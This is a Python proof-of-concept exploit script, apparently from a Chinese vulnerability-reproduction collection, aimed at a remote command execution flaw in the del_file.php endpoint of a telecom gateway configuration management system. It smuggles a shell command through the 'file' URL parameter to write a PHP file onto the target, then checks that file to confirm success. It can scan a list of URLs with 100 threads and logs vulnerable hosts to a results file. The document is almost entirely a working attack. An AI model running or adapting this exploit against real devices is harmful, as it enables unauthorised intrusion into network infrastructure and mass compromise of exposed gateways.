#电信网关配置管理系统 del_file.php RCE漏洞复现

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    banner = """                                                                                                                                                                                 
                            ,--, ,---._ ,--. ,----, ,--,                                                  
          .--.--. ,--.'| ,---, .-- -.' \ ,---, ,---, ,--.'| '。 .`| ,--.'|                                                  
         //'。 ,--, | :,`--.' | | | :,`--.' | “。” \ ,--,: : | '。 '。 ； ,--, | ：,--,,---,,--,  
        | : /`。 /,---.'| ：'| ：：：； || ： ： / ； “”。 ,`--.'`| ' ：,---, ' .,---. '| ：'，'_ /| /_ ./| ,'_ /|  
        ； | |--` | | : _' |: | ' : |: | ': :\ | ： ： | | | ：./ | | : _' | .--. | | ：,---,| ' ：.--. | | ：  
        | ：；_：：|。' || ：| | ： ：| ：|：| /\ \ : | \ | ：； | '。 /::|.' |，'_ /| ：。 | /___/ \. ：|，'_ /| ：。 |  
         \ \ `。 | ' ' ； ：' ' ； ：' ' ;| ：' ;. ：| ：' '； | `---' / ； | ' ' ； ：| ' | | 。 。 。 \ \ ,' '| ' | | 。 。  
          `----. \' | ”。 || | | | ； || | || | ;/ \ \' ' ;. ； / ； /'| ”。 || | ' | | | \ ； `，'| | ' | | |  
          __ \ \ || | : | '' : ; ___ l ' : ;' : | \ \ ,'| | | \ | ; / /--, | | : | ': | | : ' ; \ \ ' : | | : ' ;  
         / /`--' /' : | : ;| | ' / /\ J :| | '| | ' '--' ' : | ; .' / / / .`| ' : | : ;| ; ' | | ' ' \ | | ; ' | | '  
        ‘--’。 / | | ' ,/ ' : | /../`..-,'：|| ： ： | | '`--' ./__; ：| | ' ,/ : | ：； ； | \ ； ； ：| ：； ； |  
          `--'---' ； ：；--'； |.' \ \ ； ； |.' | | ,' ' : | | ：。' ； ：；--' ' ：`--' \ ：\ \' ：`--' \
                    | ,/'---' \ \ ,''---'`--''； |.' ； | '。 | ,/ : , .-./ \ ' ;: , .-./
                    '---' “---....--' '---' '---' '---' '--`----' '--` '-`----'   
                                                            info:电信网关配置管理系统 del_file.php RCE漏洞复现
                                                            version:1.0 author:YeahSir   
        """
    
    print(banner)                                                                                                                                                                                  
def main():
    banner()
    parser = argparse.ArgumentParser(description="电信网关配置管理系统 del_file.php RCE漏洞复现")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/manager/newtpl/del_file.php?file=1.txt|echo%20o8nahpm39boa2gs%20%3E%20abcwavkww.php'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
        "Accept-Encoding": "gzip, deflate, br", 
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", 
        "Connection": "close"
        }
    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

    try:
        response = requests.get(url=url,headers=headers,timeout=5,verify=False)
        payload2 = '/manager/newtpl/abcwavkww.php'
        url2 = target + payload2
        response2 = requests.get(url=url2,proxies=proxies)
        if response.status_code == 200 and 'o8nahpm39boa2gs' in response2.text:
            print( f"{GREEN}[+] {target} 存在RCE漏洞！{RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")

if __name__ == '__main__':
    main()